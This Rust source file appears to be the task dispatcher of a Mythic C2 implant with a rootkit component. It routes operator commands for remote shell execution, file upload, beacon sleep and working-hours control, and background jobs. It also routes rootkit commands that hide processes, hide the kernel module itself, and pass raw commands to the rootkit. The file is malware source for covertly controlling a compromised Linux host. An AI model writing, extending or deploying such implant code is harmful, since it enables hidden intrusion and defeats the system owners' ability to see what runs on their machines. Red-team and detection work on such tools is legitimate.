use crate::agent::{AgentTask, EchidnaAgent, SharedData};
use crate::mythic_error;
use std::collections::VecDeque;
use std::error::Error;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    mpsc, Arc,
};

use crate::shell;
use crate::upload;
use crate::rootkit_commands;

// Import functions from modules
use rootkit_commands::{
    hide_process,
    list_hidden_processes,
    toggle_module_visibility,
    get_rootkit_status,
    execute_raw_command,
    check_rootkit_health,
};

/// Struct which holds the information about background rootkit tasks
#[derive(Debug)]
pub struct BackgroundTask {
    /// Command used to spawn the background task
    pub command: String,

    /// Parameters passed to the background task
    pub parameters: String,

    /// Job id of the background task
    pub id: u32,

    /// Flag indicating if the background task should be running
    pub running: Arc<AtomicBool>,

    /// Flag indicating if this background task is designed to be manually killed
    pub killable: bool,

    /// Task id from Mythic associated with background task
    pub uuid: String,

    /// Channel for sending information from the worker thread to the background task
    tx: mpsc::Sender<serde_json::Value>,

    /// Channel for receiving information from the background task
    rx: mpsc::Receiver<serde_json::Value>,
}

/// Struct for handling rootkit-focused tasking
#[derive(Debug)]
pub struct Tasker {
    /// List of running background tasks
    pub background_tasks: Vec<BackgroundTask>,

    /// List of all completed task messages
    completed_tasks: Vec<serde_json::Value>,

    /// Value used handing out job ids to new jobs
    dispatch_val: u32,

    /// Cache for storing job ids which were used but the task is finished
    cached_ids: VecDeque<u32>,
}

/// Prototype for background task callback functions
type SpawnCbType = fn(
    &mpsc::Sender<serde_json::Value>,
    mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>>;

impl Tasker {
    pub fn new() -> Self {
        Self {
            background_tasks: Vec::new(),
            completed_tasks: Vec::new(),
            dispatch_val: 0,
            cached_ids: VecDeque::new(),
        }
    }

    /// Process the pending rootkit-focused tasks
    /// * `tasks` - Tasks needing to be processed
    /// * `shared` - Reference to the shared data of the agent
    pub fn process_tasks(
        &mut self,
        tasks: Option<&Vec<AgentTask>>,
        shared: &mut SharedData,
    ) -> Result<(), Box<dyn Error>> {
        // Iterate over each pending task
        if let Some(tasks) = tasks {
            for task in tasks.iter() {
                // Process tasks which are either background tasks or tasks where messages
                // need to be sent to an already running background task.
                let result = match task.command.as_str() {
                    "shell" => {
                        if let Err(e) = self.spawn_background(task, shell::run_cmd, false) {
                            self.completed_tasks
                                .push(mythic_error!(task.id, e.to_string()));
                        }
                        continue;
                    }

                    "upload" => {
                        if let Err(e) = self.spawn_background(task, upload::upload_file, false) {
                            self.completed_tasks
                                .push(mythic_error!(task.id, e.to_string()));
                        }
                        continue;
                    }

                    // Rootkit commands - all synchronous since they're quick /proc operations
                    "hide_process" => match rootkit_commands::hide_process(task) {
                        Ok(res) => res,
                        Err(e) => mythic_error!(task.id, e.to_string()),
                    },

                    "list_hidden" => match rootkit_commands::list_hidden_processes(task) {
                        Ok(res) => res,
                        Err(e) => mythic_error!(task.id, e.to_string()),
                    },

                    "toggle_module" => match rootkit_commands::toggle_module_visibility(task) {
                        Ok(res) => res,
                        Err(e) => mythic_error!(task.id, e.to_string()),
                    },

                    "rootkit_status" => match rootkit_commands::get_rootkit_status(task) {
                        Ok(res) => res,
                        Err(e) => mythic_error!(task.id, e.to_string()),
                    },

                    "rootkit_health" => match rootkit_commands::check_rootkit_health(task) {
                        Ok(res) => res,
                        Err(e) => mythic_error!(task.id, e.to_string()),
                    },

                    "raw_rootkit_cmd" => match rootkit_commands::execute_raw_command(task) {
                        Ok(res) => res,
                        Err(e) => mythic_error!(task.id, e.to_string()),
                    },

                    // Background rootkit operations that may take time
                    "stealth_exec" => {
                        // NOTE: stealth_execute_background function not implemented yet
                        // Commenting out until implemented
                        /*
                        if let Err(e) =
                            self.spawn_background(task, stealth_execute_background, true)
                        {
                            self.completed_tasks
                                .push(mythic_error!(task.id, e.to_string()));
                        }
                        */
                        self.completed_tasks.push(mythic_error!(task.id, "stealth_exec not implemented yet"));
                        continue;
                    }

                    // Job management for background tasks
                    "jobkill" => {
                        match kill_job(task, &self.background_tasks) {
                            Ok(res) => {
                                for msg in res {
                                    self.completed_tasks.push(msg);
                                }
                            }
                            Err(e) => self
                                .completed_tasks
                                .push(mythic_error!(task.id, e.to_string())),
                        }
                        continue;
                    }

                    "jobs" => {
                        self.completed_tasks
                            .push(list_jobs(task, &self.background_tasks));
                        continue;
                    }

                    // This is used if messages need to be sent to an already running background
                    // task.
                    "continued_task" => {
                        for job in &self.background_tasks {
                            if task.id == job.uuid {
                                let msg = match serde_json::to_value(task) {
                                    Ok(m) => m,
                                    Err(e) => {
                                        self.completed_tasks
                                            .push(mythic_error!(task.id, e.to_string()));
                                        break;
                                    }
                                };
                                if let Err(e) = job.tx.send(msg) {
                                    self.completed_tasks
                                        .push(mythic_error!(task.id, e.to_string()));
                                }
                                break;
                            }
                        }
                        continue;
                    }

                    // Process any special task which requires shared data
                    "exit" => {
                        shared.exit_agent = true;
                        crate::mythic_success!(task.id, "Agent shutting down")
                    }
                    "sleep" => {
                        match crate::sleep::set_sleep(
                            task,
                            &mut shared.sleep_interval,
                            &mut shared.jitter,
                        ) {
                            Ok(res) => res,
                            Err(e) => mythic_error!(task.id, e.to_string()),
                        }
                    }
                    "workinghours" => match crate::workinghours::working_hours(task, shared) {
                        Ok(res) => res,
                        Err(e) => mythic_error!(task.id, e.to_string()),
                    },

                    // Default case for unknown commands
                    _ => mythic_error!(task.id, format!("Unknown command: {}", task.command)),
                };

                // Add the result to completed tasks
                self.completed_tasks.push(result);
            }
        }
        Ok(())
    }

    /// Get completed tasks from both synchronous operations and background jobs
    pub fn get_completed_tasks(&mut self) -> Result<Vec<serde_json::Value>, Box<dyn Error>> {
        // Create the completed task information list
        let mut completed_tasks: Vec<serde_json::Value> = Vec::new();

        // Iterate over running background jobs
        for task in self.background_tasks.iter() {
            // Check if a background job has any messages to send up to Mythic and add
            // them to the completed_tasks Vec
            while let Ok(msg) = task.rx.try_recv() {
                completed_tasks.push(msg);
            }

            // Check if the background task is still running.
            if !task.running.load(Ordering::SeqCst) || Arc::strong_count(&task.running) == 1 {
                // If the task is marked as ended, grab all of the messages from the channel queue
                while let Ok(msg) = task.rx.try_recv() {
                    completed_tasks.push(msg);
                }

                task.running.store(false, Ordering::SeqCst);
                self.cached_ids.push_back(task.id);
            }
        }

        // Filter out any background tasks which are not running
        self.background_tasks
            .retain(|x| x.running.load(Ordering::SeqCst));

        // Add synchronous task results
        completed_tasks.append(&mut self.completed_tasks);

        Ok(completed_tasks)
    }

    /// Spawn the task but in a new thread. This will set up the necessary tracking information
    /// and means of communication.
    /// spawn_background takes a callback function which is the function that will run in
    /// its own thread.
    ///
    /// Arguments:
    /// * `task` - The task being spawned
    /// * `callback` - Callback function for completing the task
    /// * `killable` - `false` returns an error in Mythic if the task is manually killed
    fn spawn_background(
        &mut self,
        task: &AgentTask,
        callback: SpawnCbType,
        killable: bool,
    ) -> Result<(), Box<dyn Error>> {
        // Set up channels for communication
        let (tasker_tx, job_rx) = mpsc::channel();
        let (job_tx, tasker_rx) = mpsc::channel();

        // Assign a new ID to the job
        let id = if let Some(id) = self.cached_ids.pop_front() {
            id
        } else {
            self.dispatch_val += 1;
            self.dispatch_val - 1
        };

        // Create a new flag indicating that the task is running
        let running = Arc::new(AtomicBool::new(true));
        let running_ref = running.clone();

        let uuid = task.id.clone();

        // Spawn a new thread for the background task
        std::thread::spawn(move || {
            // Invoke the callback function
            if let Err(e) = callback(&job_tx, job_rx) {
                // If the function returns an error, relay the error message back to Mythic
                let _ = job_tx.send(mythic_error!(uuid, e.to_string()));
            }
            // Once the task ends, mark it as not running
            running_ref.store(false, Ordering::SeqCst);
        });

        // After the new thread for the task is spawned, pass along the initial message
        tasker_tx.send(serde_json::to_value(task)?)?;

        // Append this new task to the Vec of background tasks
        self.background_tasks.push(BackgroundTask {
            command: task.command.clone(),
            parameters: task.parameters.clone(),
            uuid: task.id.clone(),
            killable,
            id,
            running,
            tx: tasker_tx,
            rx: tasker_rx,
        });
        Ok(())
    }
}

/// Kill a background job
/// * `task` - Task information
/// * `background_tasks` - List of currently running background tasks
fn kill_job(
    task: &AgentTask,
    background_tasks: &[BackgroundTask],
) -> Result<Vec<serde_json::Value>, Box<dyn Error>> {
    crate::jobs::kill_job(task, background_tasks)
}

/// List currently running background jobs
/// * `task` - Task information
/// * `background_tasks` - List of currently running background tasks
fn list_jobs(task: &AgentTask, background_tasks: &[BackgroundTask]) -> serde_json::Value {
    crate::jobs::list_jobs(task, background_tasks)
}